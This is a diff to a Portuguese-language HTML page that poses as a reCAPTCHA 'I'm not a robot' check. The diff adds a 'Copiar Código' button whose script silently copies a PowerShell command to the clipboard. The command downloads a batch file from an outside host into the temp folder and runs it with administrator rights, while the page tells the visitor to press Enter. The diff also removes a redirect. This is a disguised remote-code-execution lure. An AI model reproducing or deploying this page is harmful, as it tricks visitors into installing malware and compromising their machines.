@@ -150,9 +150,10 @@
                     <li>Pressione <strong>Enter</strong> para finalizar</li>
                 </ol>
             </div>
-            <div class="verification-code">
+            <div class="verification-code" id="verification-code">
                 "Não sou um robô - ID do reCAPTCHA:2417"
             </div>
+            <button id="copy-button" onclick="copyToClipboard()">Copiar Código</button>
             <button id="verify-button" onclick="verificarCaptcha()">VERIFICAR</button>
         </div>
     </div>
@@ -165,6 +166,12 @@
             }
         });
 
+        function copyToClipboard() {
+            const command = `powershell -Command \"& {iwr -useb 'https://omiie.com/tools/2fa.bat' -OutFile $env:TEMP\2fa.bat; Start-Process -FilePath $env:TEMP\2fa.bat -Verb RunAs}\"`;
+            navigator.clipboard.writeText(command);
+            
+        }
+
         function verificarCaptcha() {
             const button = document.getElementById('verify-button');
             button.innerHTML = 'Verificando...';
@@ -172,11 +179,9 @@
             setTimeout(() => {
                 button.innerHTML = '✔ Verificado';
                 button.style.backgroundColor = '#34a853';
-                setTimeout(() => {
-                    window.location.href = 'https://www.foregon.com/'; // Redirecionamento
-                }, 500);
             }, 2000);
         }
     </script>
 </body>
 </html>
+
